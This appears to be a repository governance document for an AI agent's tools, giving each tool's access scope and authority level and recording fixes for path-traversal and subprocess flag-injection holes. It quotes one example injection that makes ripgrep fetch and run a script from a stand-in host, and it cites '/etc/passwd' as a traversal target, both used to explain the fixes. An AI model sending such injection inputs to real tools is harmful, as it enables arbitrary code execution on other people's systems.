# Tool Mandates

## Known asymmetries and history

(a) **read-file is harness-only with no MCP mandate**: The `read-file` tool is registered in the harness tool registry (`src/agents/tools/registry.ts`) but has NO corresponding MCP schema, type, or handler. It is reachable only from the internal agent loop, never from an external MCP client.

(b) **Shared path-traversal gap fixed in this sprint**: A shared unrestricted path-traversal vulnerability was found in BOTH `src/agents/tools/read-file.ts` and `src/shared/retrieval/router.ts`'s "file" strategy. Both files used inline path resolution that accepted any absolute path (e.g., `/etc/passwd`) or relative paths with `../` that could escape PROJECT_ROOT. This was fixed in Step 2 of sprint-108 via a shared `src/shared/security/safe-path.ts` helper (`resolveSafePath`) that uses `fs.realpathSync()` to prevent symlink escapes. The fix affects two concrete call sites:

- `read-file.ts`: Replaced `path.isAbsolute(args.path) ? args.path : path.join(PROJECT_ROOT, args.path)` with `resolveSafePath(args.path, PROJECT_ROOT)`
- `router.ts` "file" strategy: Replaced `path.isAbsolute(query) ? query : path.resolve(process.cwd(), query)` with `resolveSafePath(query, process.cwd())`

(c) **PROJECT_ROOT drift issue fixed in Step 2b**: A drift issue was identified where `read-file.ts` computed `PROJECT_ROOT = process.env.PROJECT_ROOT ?? path.resolve(process.cwd())` while `router.ts` used `process.cwd()` directly. This created two independent sources that could diverge if `PROJECT_ROOT` environment variable was set differently from the current working directory. Step 2b fixed this by creating `src/shared/config/paths.ts` with a single exported `PROJECT_ROOT` constant, and updating both `read-file.ts` and `router.ts` to import it. This makes the drift class of bug "structurally impossible going forward".

(d) **REPO_ROOT unification (Step 2c)**: A third independently-named root variable (`REPO_ROOT`) was found in `src/shared/retrieval/code-search.ts`, computed locally as `path.resolve(process.env.REPO_ROOT ?? process.cwd())`. This created a third source that could diverge from `PROJECT_ROOT`. Step 2c fixed this by importing `PROJECT_ROOT` from `src/shared/config/paths.ts` and aliasing it as `REPO_ROOT` for historical compatibility. Now all three call sites use the same root computation.

(e) **Subprocess flag-injection fix in code-search.ts (Step 2c)**: The `searchCode()` function passed user-controlled `pattern` directly to `execFile("rg", args, ...)` without a `"--"` end-of-options marker. A query like `--pre=curl evil.example/x|sh` would be interpreted by ripgrep as the `--pre` option, executing arbitrary commands on every scanned file. Step 2c fixed this by adding `"--"` separator before `pattern` in args array. This is arguably higher severity than path traversal since it enables command execution rather than just file reads.

(f) **Both call sites confirmed fixed**: Step 2's progress entry explicitly confirms both vulnerable locations were migrated to use the shared `resolveSafePath` helper, eliminating duplication and ensuring consistent security behavior.

## Tool entries

### read-file

- **Surface**: Harness only (registered in `src/agents/tools/registry.ts`, no MCP schema/type/handler)
- **Reads**: Filesystem (`fs.readFileSync`)
- **Writes**: No writes (read-only)
- **Boundary**: Yes — uses `resolveSafePath` from `src/shared/security/safe-path.ts` to prevent path traversal (Step 2 fix)
- **External effect**: No (only reads files within PROJECT_ROOT)
- **Authority level**: Autonomous (L1 — read-only, bounded to repo root, no approval needed)
- **Owner**: [unassigned]

### vector-search

- **Surface**: Both harness and MCP (registered in `src/agents/tools/registry.ts`, MCP schema `VectorSearchSchema`, handler `handleVectorSearch`)
- **Reads**: Network calls to embeddings service (HTTP POST) and Qdrant (HTTP GET)
- **Writes**: Network writes (HTTP requests)
- **Boundary**: No explicit boundary logic
- **External effect**: Yes (makes HTTP calls to external services: embeddings and Qdrant)
- **Authority level**: NEEDS REVIEW — makes network writes to external services
- **Owner**: [unassigned]

### search-code

- **Surface**: Both harness and MCP (registered in `src/agents/tools/registry.ts`, MCP schema `SearchCodeSchema`, handler `handleSearchCode`)
- **Reads**: Filesystem (via subprocess ripgrep)
- **Writes**: Subprocess stdout (writes to stdout via `childProcess.execFile`)
- **Boundary**: Yes — `resolveGlob()` uses `PROJECT_ROOT` from shared config; subprocess args include `"--"` separator to prevent flag injection (Step 2c fix)
- **External effect**: No (subprocess runs locally, output stays within process)
- **Authority level**: NEEDS REVIEW — subprocess execution (even though bounded, subprocess writes to stdout)
- **Owner**: [unassigned]

### retrieve

- **Surface**: Both harness and MCP (registered in `src/agents/tools/registry.ts`, MCP schema `RetrieveSchema`, handler `handleRetrieve`)
- **Reads**: Delegates to vector-search (network), search-code (subprocess), or file read (filesystem)
- **Writes**: Delegates to underlying tools (network or subprocess)
- **Boundary**: No explicit boundary logic on retrieve itself (delegates to tools with their own guards)
- **External effect**: Depends on strategy — vector (network), code (subprocess), file (filesystem only)
- **Authority level**: NEEDS REVIEW — delegates to multiple tools with different authority levels
- **Owner**: [unassigned]

### router (internal)

- **Surface**: Internal only (no tool registration, used by retrieve.ts)
- **Reads**: Filesystem (via "file" strategy using `fs.readFileSync`)
- **Writes**: No writes (read-only for "file" strategy)
- **Boundary**: Yes — "file" strategy uses `resolveSafePath` from `src/shared/security/safe-path.ts` with `PROJECT_ROOT` (Step 2 fix, Step 3 fix: single source of truth)
- **External effect**: No (only reads files within PROJECT_ROOT)
- **Authority level**: Autonomous (L1 — read-only, bounded to repo root, no approval needed)
- **Owner**: [unassigned]

### vector-client (internal)

- **Surface**: Internal only (used by vector-search.ts and router.ts)
- **Reads**: Network calls to embeddings service and Qdrant
- **Writes**: Network writes (HTTP requests)
- **Boundary**: No explicit boundary logic
- **External effect**: Yes (makes HTTP calls to external services)
- **Authority level**: NEEDS REVIEW — makes network writes to external services
- **Owner**: [unassigned]

### code-search (internal)

- **Surface**: Internal only (used by search-code.ts and router.ts)
- **Reads**: Filesystem (via subprocess ripgrep)
- **Writes**: Subprocess stdout (writes to stdout via `childProcess.execFile`)
- **Boundary**: Yes — `resolveGlob()` throws if resolved path escapes REPO_ROOT
- **External effect**: No (subprocess runs locally, output stays within process)
- **Authority level**: NEEDS REVIEW — subprocess execution (even though bounded, subprocess writes to stdout)
- **Owner**: [unassigned]

### format (internal)

- **Surface**: Internal only (used by vector-search.ts, search-code.ts, retrieve.ts)
- **Reads**: No filesystem/network/subprocess access
- **Writes**: No writes (pure formatting helpers)
- **Boundary**: N/A (no external access)
- **External effect**: No
- **Authority level**: Autonomous (L1 — read-only, bounded to repo root, no approval needed)
- **Owner**: [unassigned]

## Adding a new tool

Any new tool must have an entry here before merging. Anything that:

- Writes to filesystem/network/subprocess
- Executes codear

- Calls a paid API
- Reads outside a guaranteed-bounded path

must go through an approval gate and get a decision-receipt.

| Tool name  | Surface | Reads | Writes | Boundary | External effect | Authority level | Owner        | Decision receipt |
| ---------- | ------- | ----- | ------ | -------- | --------------- | --------------- | ------------ | ---------------- |
| (new tool) |         |       |        |          |                 |                 | [unassigned] |                  |
